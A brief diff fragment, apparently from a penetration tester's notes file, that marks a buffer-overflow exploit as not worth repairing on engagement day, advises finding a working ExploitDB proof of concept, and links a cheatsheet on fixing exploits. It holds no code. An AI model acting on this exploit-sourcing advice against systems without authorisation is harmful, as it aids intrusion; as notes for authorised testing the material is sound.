+    discovery). Out of scope for engagement-day repair per vault §5 warning.
+    Classification-only — abandon and find a working ExploitDB PoC.
+  references:
+    - vault_path: vault/_CHEATSHEETS/Fixing_Exploits.md#section-5-fixing-buffer-overflow-exploits
